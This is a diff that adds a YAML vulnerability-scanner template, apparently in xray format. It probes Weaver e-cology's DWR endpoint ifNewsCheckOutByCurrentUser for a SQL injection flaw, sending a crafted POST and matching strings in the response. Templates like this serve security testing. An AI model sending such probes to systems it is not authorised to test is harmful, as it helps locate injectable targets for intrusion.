@@ -1,0 +1,22 @@
+name: poc-yaml-weaver-ecology-ifnewscheckoutbycurrentuser-dwr-sqli
+manual: true
+transport: http
+rules:
+    r1:
+        request:
+            cache: true
+            method: POST
+            path: /dwr/exec/DocDwrUtil.ifNewsCheckOutByCurrentUser
+            headers:
+                Content-Type: text/plain
+            body: |-
+                callCount=1
+                c0-scriptName=DocDwrUtil
+                c0-methodName=ifNewsCheckOutByCurrentUser
+                c0-id=3561_1691581516970
+                c0-param0=string:
+                c0-param1=number:123
+                xml=true
+        expression: response.body_string.contains("DWREngine._handleResponse") && response.body_string.contains("var s0 = false") && response.body_string.contains("3561_1691581516970")
+expression: r1()
+detail: {}
